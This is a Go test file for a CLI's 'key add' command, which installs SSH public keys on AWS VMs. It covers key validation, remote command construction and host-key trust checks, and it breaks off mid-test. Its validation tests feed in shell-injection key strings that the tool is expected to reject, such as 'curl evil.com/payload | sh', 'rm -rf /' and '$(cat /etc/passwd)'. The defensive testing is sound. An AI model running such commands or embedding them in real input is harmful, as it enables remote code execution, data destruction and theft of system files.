package cmd

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2instanceconnect"
	"github.com/nicholasgasior/mint/internal/cli"
	"github.com/nicholasgasior/mint/internal/sshconfig"
	"github.com/spf13/cobra"

	mintaws "github.com/nicholasgasior/mint/internal/aws"
)

// testEd25519Key is a valid ed25519 public key for testing.
const testEd25519Key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGtest1234567890abcdefghijklmnopqrstuvwxyz test@host"

// testRSAKey is a valid RSA public key for testing.
const testRSAKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7test1234 test@host"

// testECDSAKey is a valid ECDSA public key for testing.
const testECDSAKey = "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/test test@host"

// keyMockRemote captures remote command invocations for key add testing.
type keyMockRemote struct {
	calls  []keyMockRemoteCall
	output []byte
	err    error
}

type keyMockRemoteCall struct {
	instanceID string
	az         string
	host       string
	port       int
	user       string
	command    []string
}

func (m *keyMockRemote) run(
	ctx context.Context,
	sendKey mintaws.SendSSHPublicKeyAPI,
	instanceID string,
	az string,
	host string,
	port int,
	user string,
	command []string,
) ([]byte, error) {
	m.calls = append(m.calls, keyMockRemoteCall{
		instanceID: instanceID,
		az:         az,
		host:       host,
		port:       port,
		user:       user,
		command:    command,
	})
	return m.output, m.err
}

// newTestRootForKey creates a minimal root command for key tests.
func newTestRootForKey() *cobra.Command {
	root := &cobra.Command{
		Use:           "mint",
		SilenceUsage:  true,
		SilenceErrors: true,
		PersistentPreRunE: func(cmd *cobra.Command, args []string) error {
			cliCtx := cli.NewCLIContext(cmd)
			cmd.SetContext(cli.WithContext(context.Background(), cliCtx))
			return nil
		},
	}
	root.PersistentFlags().Bool("verbose", false, "Show progress steps")
	root.PersistentFlags().Bool("debug", false, "Show AWS SDK details")
	root.PersistentFlags().Bool("json", false, "Machine-readable JSON output")
	root.PersistentFlags().Bool("yes", false, "Skip confirmation on destructive operations")
	root.PersistentFlags().String("vm", "default", "Target VM name")
	return root
}

func TestKeyAddValidatesKeyFormat(t *testing.T) {
	tests := []struct {
		name    string
		key     string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid ed25519 key",
			key:     testEd25519Key,
			wantErr: false,
		},
		{
			name:    "valid rsa key",
			key:     testRSAKey,
			wantErr: false,
		},
		{
			name:    "valid ecdsa key",
			key:     testECDSAKey,
			wantErr: false,
		},
		{
			name:    "valid ssh-dss key",
			key:     "ssh-dss AAAAB3NzaC1kc3MAAACBANtest test@host",
			wantErr: false,
		},
		{
			name:    "valid sk-ssh key",
			key:     "sk-ssh-ed25519@openssh.com AAAAGnNrLXNzaC1lZDI1NTE5QG9wZW5zc2guY29tAAAAIE/test test@host",
			wantErr: false,
		},
		{
			name:    "invalid key format",
			key:     "not-a-valid-key",
			wantErr: true,
			errMsg:  "invalid SSH public key",
		},
		{
			name:    "empty key",
			key:     "",
			wantErr: true,
			errMsg:  "public key is empty",
		},
		{
			name:    "key with only whitespace",
			key:     "   \n  ",
			wantErr: true,
			errMsg:  "public key is empty",
		},
		{
			name:    "key with shell injection via single quote",
			key:     "ssh-ed25519 AAAA' ; curl evil.com/payload | sh ; echo '",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "key with semicolon injection",
			key:     "ssh-ed25519 AAAA; rm -rf /",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "key with backtick injection",
			key:     "ssh-ed25519 AAAA`whoami`",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "key with dollar sign injection",
			key:     "ssh-ed25519 AAAA$(cat /etc/passwd)",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "key with pipe injection",
			key:     "ssh-ed25519 AAAA | curl evil.com",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "key with newline injection",
			key:     "ssh-ed25519 AAAA\nmalicious-command",
			wantErr: true,
			errMsg:  "invalid characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validatePublicKey(tt.key)
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected error, got nil")
				}
				if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("error %q does not contain %q", err.Error(), tt.errMsg)
				}
			} else {
				if err != nil {
					t.Fatalf("unexpected error: %v", err)
				}
			}
		})
	}
}

func TestKeyAddReadsFromFile(t *testing.T) {
	tmpDir := t.TempDir()
	keyFile := filepath.Join(tmpDir, "id_ed25519.pub")
	if err := os.WriteFile(keyFile, []byte(testEd25519Key+"\n"), 0o644); err != nil {
		t.Fatalf("write key file: %v", err)
	}

	remote := &keyMockRemote{output: []byte{}} // grep returns empty (no match)
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:abc123", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", keyFile})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should have called remote runner twice: grep check + echo append.
	if len(remote.calls) != 2 {
		t.Fatalf("expected 2 remote calls, got %d", len(remote.calls))
	}

	// First call should be a single-element grep command.
	grepCall := remote.calls[0]
	if len(grepCall.command) != 1 {
		t.Errorf("grep call should be a single-element command slice, got %d elements: %v", len(grepCall.command), grepCall.command)
	}
	if !strings.Contains(grepCall.command[0], "grep -F") {
		t.Errorf("first remote call should contain 'grep -F', got: %v", grepCall.command)
	}

	// Second call should be the append command as a single element.
	appendCall := remote.calls[1]
	if len(appendCall.command) != 1 {
		t.Errorf("append call should be a single-element command slice, got %d elements: %v", len(appendCall.command), appendCall.command)
	}
	if !strings.Contains(appendCall.command[0], "authorized_keys") {
		t.Errorf("second remote call should append to authorized_keys, got: %v", appendCall.command)
	}

	// Output should mention the fingerprint.
	output := buf.String()
	if !strings.Contains(output, "SHA256:abc123") {
		t.Errorf("output should contain fingerprint, got: %s", output)
	}
}

func TestKeyAddReadsFromStdin(t *testing.T) {
	remote := &keyMockRemote{output: []byte{}} // grep returns empty (no match)
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:stdin123", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)

	// Simulate stdin with the key.
	root.SetIn(strings.NewReader(testEd25519Key + "\n"))
	root.SetArgs([]string{"key", "add", "-"})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(remote.calls) != 2 {
		t.Fatalf("expected 2 remote calls, got %d", len(remote.calls))
	}

	output := buf.String()
	if !strings.Contains(output, "SHA256:stdin123") {
		t.Errorf("output should contain fingerprint, got: %s", output)
	}
}

func TestKeyAddAcceptsInlineKey(t *testing.T) {
	remote := &keyMockRemote{output: []byte{}} // grep returns empty (no match)
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:inline123", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)

	// Pass the key directly as an argument (not a file path).
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(remote.calls) != 2 {
		t.Fatalf("expected 2 remote calls, got %d", len(remote.calls))
	}
}

func TestKeyAddDetectsDuplicate(t *testing.T) {
	// grep returns the key (meaning it already exists).
	remote := &keyMockRemote{output: []byte(testEd25519Key)}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:dup123", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should only have called grep (no append).
	if len(remote.calls) != 1 {
		t.Fatalf("expected 1 remote call (grep only), got %d", len(remote.calls))
	}

	output := buf.String()
	if !strings.Contains(output, "already") {
		t.Errorf("output should indicate key already exists, got: %s", output)
	}
}

func TestKeyAddVMNotFound(t *testing.T) {
	remote := &keyMockRemote{}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: &ec2.DescribeInstancesOutput{}},
		sendKey:        &mockSendSSHPublicKey{},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 test", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error, got nil")
	}
	if !strings.Contains(err.Error(), "mint up") {
		t.Errorf("error should mention mint up, got: %s", err.Error())
	}
}

func TestKeyAddVMNotRunning(t *testing.T) {
	remote := &keyMockRemote{}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeStoppedInstanceForSSH("i-abc123", "default", "alice")},
		sendKey:        &mockSendSSHPublicKey{},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 test", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error, got nil")
	}
	if !strings.Contains(err.Error(), "not running") {
		t.Errorf("error should mention not running, got: %s", err.Error())
	}
}

func TestKeyAddRemoteRunnerError(t *testing.T) {
	remote := &keyMockRemote{err: fmt.Errorf("connection refused")}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error, got nil")
	}
	if !strings.Contains(err.Error(), "connection refused") {
		t.Errorf("error should contain remote runner error, got: %s", err.Error())
	}
}

func TestKeyAddNonDefaultVM(t *testing.T) {
	remote := &keyMockRemote{output: []byte{}}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-dev456", "dev", "alice", "10.0.0.1", "us-west-2a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:devkey", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"--vm", "dev", "key", "add", testEd25519Key})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Remote calls should target the right host.
	if len(remote.calls) < 1 {
		t.Fatal("expected at least 1 remote call")
	}
	if remote.calls[0].host != "10.0.0.1" {
		t.Errorf("expected host 10.0.0.1, got %s", remote.calls[0].host)
	}
}

func TestKeyAddNoArgument(t *testing.T) {
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{},
		owner:          "alice",
		remoteRunner:   (&keyMockRemote{}).run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 test", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add"})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error for missing argument, got nil")
	}
}

func TestKeyAddRemoteCommandConstruction(t *testing.T) {
	remote := &keyMockRemote{output: []byte{}}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:verify", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(remote.calls) != 2 {
		t.Fatalf("expected 2 remote calls, got %d", len(remote.calls))
	}

	// Verify grep call is a single-element command containing the complete compound invocation.
	// SSH joins multi-element command slices with spaces on the remote side, which breaks
	// compound commands — so the entire remote command must be a single string.
	grepCall := remote.calls[0]
	if len(grepCall.command) != 1 {
		t.Fatalf("grep call must be a single-element slice (complete compound command), got %d elements: %v",
			len(grepCall.command), grepCall.command)
	}
	grepScript := grepCall.command[0]
	if !strings.Contains(grepScript, "grep -F") {
		t.Errorf("grep command should contain 'grep -F', got: %s", grepScript)
	}
	if !strings.Contains(grepScript, "authorized_keys") {
		t.Errorf("grep command should reference authorized_keys, got: %s", grepScript)
	}
	if !strings.Contains(grepScript, "|| true") {
		t.Errorf("grep command should contain '|| true' to tolerate missing files, got: %s", grepScript)
	}
	// The key must appear in the grep command (embedded via quoting).
	if !strings.Contains(grepScript, "ssh-ed25519") {
		t.Errorf("grep command should contain the key content (single-quote embedded), got: %s", grepScript)
	}
	if grepCall.instanceID != "i-abc123" {
		t.Errorf("wrong instance ID: %s", grepCall.instanceID)
	}
	if grepCall.az != "us-east-1a" {
		t.Errorf("wrong AZ: %s", grepCall.az)
	}
	if grepCall.host != "1.2.3.4" {
		t.Errorf("wrong host: %s", grepCall.host)
	}
	if grepCall.port != defaultSSHPort {
		t.Errorf("wrong port: %d", grepCall.port)
	}
	if grepCall.user != defaultSSHUser {
		t.Errorf("wrong user: %s", grepCall.user)
	}

	// Verify the append call is a single-element command containing the complete
	// mkdir+printf compound command. The key must be embedded (single-quote wrapped)
	// in the command string — not split off as a separate positional argument.
	appendCall := remote.calls[1]
	if len(appendCall.command) != 1 {
		t.Fatalf("append call must be a single-element slice (complete compound command), got %d elements: %v",
			len(appendCall.command), appendCall.command)
	}
	appendScript := appendCall.command[0]
	if !strings.Contains(appendScript, "mkdir -p") {
		t.Errorf("append command should contain 'mkdir -p' for the .ssh directory: %s", appendScript)
	}
	if !strings.Contains(appendScript, "authorized_keys") {
		t.Errorf("append command should reference authorized_keys: %s", appendScript)
	}
	// The key must be embedded in the single command string.
	if !strings.Contains(appendScript, "ssh-ed25519") {
		t.Errorf("append command should contain the key content (single-quote embedded), got: %s", appendScript)
	}
	// The compound command (mkdir && printf) must be intact in the single string.
	if !strings.Contains(appendScript, "&&") {
		t.Errorf("append command should be a compound command joined with &&, got: %s", appendScript)
	}
}

// TestKeyAddSingleElementCommandSlice verifies the fix for the SSH arg-joining bug.
//
// When defaultRemoteRunner receives a multi-element command slice it appends all
// elements as separate SSH arguments. SSH then joins those arguments with spaces
// on the remote side, causing the remote shell to interpret only the first word
// as the -c script — silently discarding the rest of the compound command.
//
// The fix passes the entire remote invocation as a single string element so the
// remote shell receives the complete compound command (mkdir+printf or grep+||true)
// verbatim.
func TestKeyAddSingleElementCommandSlice(t *testing.T) {
	remote := &keyMockRemote{output: []byte{}} // grep returns empty (no match)
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:single", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	if err := root.Execute(); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(remote.calls) != 2 {
		t.Fatalf("expected 2 remote calls, got %d", len(remote.calls))
	}

	// Both remote calls must be single-element slices. A multi-element slice
	// would cause SSH to break the compound command across separate args.
	for i, call := range remote.calls {
		if len(call.command) != 1 {
			t.Errorf("call[%d]: expected single-element command slice (prevents SSH arg-splitting), got %d elements: %v",
				i, len(call.command), call.command)
		}
	}

	// The grep command must contain the full compound expression in one string.
	grepCmd := remote.calls[0].command[0]
	if !strings.Contains(grepCmd, "grep -F") || !strings.Contains(grepCmd, "|| true") {
		t.Errorf("grep command must be a complete compound invocation (grep -F ... || true) in a single string, got: %s", grepCmd)
	}

	// The append command must contain the full mkdir+printf compound command.
	appendCmd := remote.calls[1].command[0]
	if !strings.Contains(appendCmd, "mkdir -p") || !strings.Contains(appendCmd, "&&") {
		t.Errorf("append command must be a complete compound invocation (mkdir -p ... && printf ...) in a single string, got: %s", appendCmd)
	}
}

func TestKeyCommandParentHasAddSubcommand(t *testing.T) {
	cmd := newKeyCommand()

	// Verify the key command has an "add" subcommand.
	found := false
	for _, sub := range cmd.Commands() {
		if sub.Name() == "add" {
			found = true
			break
		}
	}
	if !found {
		t.Error("key command should have an 'add' subcommand")
	}
}

func TestKeyAddTOFUHostKeyVerification(t *testing.T) {
	// First connection should record the key.
	remote := &keyMockRemote{output: []byte{}}
	store := sshconfig.NewHostKeyStore(t.TempDir())
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   store,
		hostKeyScanner: mockHostKeyScanner("SHA256:tofufp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:added", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Verify host key was recorded.
	matched, _, checkErr := store.CheckKey("default", "SHA256:tofufp")
	if checkErr != nil {
		t.Fatalf("CheckKey: %v", checkErr)
	}
	if !matched {
		t.Error("host key should have been recorded via TOFU")
	}
}

func TestKeyAddTOFUHostKeyMismatch(t *testing.T) {
	store := sshconfig.NewHostKeyStore(t.TempDir())
	// Pre-store a different key.
	if err := store.RecordKey("default", "SHA256:oldfp"); err != nil {
		t.Fatalf("RecordKey: %v", err)
	}

	remote := &keyMockRemote{output: []byte{}}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   store,
		hostKeyScanner: mockHostKeyScanner("SHA256:newfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINew", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error for host key mismatch, got nil")
	}
	if !strings.Contains(err.Error(), "HOST KEY CHANGED") {
		t.Errorf("error should mention HOST KEY CHANGED, got: %s", err.Error())
	}

	// Remote runner should NOT have been called.
	if len(remote.calls) != 0 {
		t.Errorf("remote runner should not be called on host key mismatch, got %d calls", len(remote.calls))
	}
}

func TestKeyAddRejectsShellInjection(t *testing.T) {
	// A malicious key that passes prefix validation but contains shell metacharacters.
	// This must be rejected by character validation before reaching the remote runner.
	maliciousKey := "ssh-ed25519 AAAA' ; curl evil.com/payload | sh ; echo '"

	remote := &keyMockRemote{output: []byte{}}
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", maliciousKey})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error for malicious key, got nil")
	}
	if !strings.Contains(err.Error(), "invalid characters") {
		t.Errorf("error should mention invalid characters, got: %s", err.Error())
	}

	// The remote runner must NOT have been called at all.
	if len(remote.calls) != 0 {
		t.Errorf("remote runner should not be called for malicious key, got %d calls", len(remote.calls))
	}
}

func TestKeyAddTOFUKeyscanCachedAcrossCalls(t *testing.T) {
	// Verify that the TOFU keyscan runs exactly once across the grep
	// and append remote calls (caching via TOFURemoteRunner).
	scanCalls := 0
	scanner := func(host string, port int) (string, string, error) {
		scanCalls++
		return "SHA256:cachedfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil
	}

	remote := &keyMockRemote{output: []byte{}} // grep returns empty (no match)
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: scanner,
		fingerprintFn:  func(key string) (string, error) { return "SHA256:cached", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Grep + append = 2 remote calls, but keyscan should only run once.
	if len(remote.calls) != 2 {
		t.Fatalf("expected 2 remote calls, got %d", len(remote.calls))
	}
	if scanCalls != 1 {
		t.Errorf("keyscan should be called exactly once (cached), got %d calls", scanCalls)
	}
}

func TestKeyAddFreshVMMissingAuthorizedKeys(t *testing.T) {
	// On a fresh VM, authorized_keys doesn't exist. The old bare grep command
	// would exit with code 2 (file not found), causing remoteRunner to return
	// an error. The sh -c wrapper with "|| true" tolerates this and returns
	// empty output, so the key add proceeds to append.
	remote := &keyMockRemote{output: []byte{}} // grep wrapper returns empty (file missing or no match)
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-fresh", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:freshfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:fresh123", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should have called remote runner twice: grep check + append.
	if len(remote.calls) != 2 {
		t.Fatalf("expected 2 remote calls, got %d", len(remote.calls))
	}

	// Verify grep is a single-element command containing || true (tolerates missing file).
	grepCall := remote.calls[0]
	if len(grepCall.command) != 1 {
		t.Fatalf("grep call must be a single-element command slice, got %d: %v", len(grepCall.command), grepCall.command)
	}
	grepScript := grepCall.command[0]
	if !strings.Contains(grepScript, "|| true") {
